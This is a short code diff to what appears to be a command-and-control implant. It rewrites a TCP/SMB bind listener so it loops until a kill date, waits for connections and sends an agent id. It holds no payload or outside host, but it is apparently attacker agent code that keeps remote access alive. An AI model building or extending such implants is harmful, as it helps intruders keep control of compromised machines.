@@ -145,8 +145,11 @@ void command_tcp_bind_start() {
 	/* init winsock */
 	channel_winsock_init();
 
-	/* while we are an SMB server... do this stuff */
-	while (sleep_time > 0) {
+	/* while we are an SMB server... do this stuff. sleep 0 = interactive,
+	 * never a loop exit (see command_link_wait). */
+	while (TRUE) {
+		if (check_kill_date())
+			safe_exit();
 		/* wait for a connection and send our agent id */
 		if (!tcp_server_wait(bindto))
 			break;
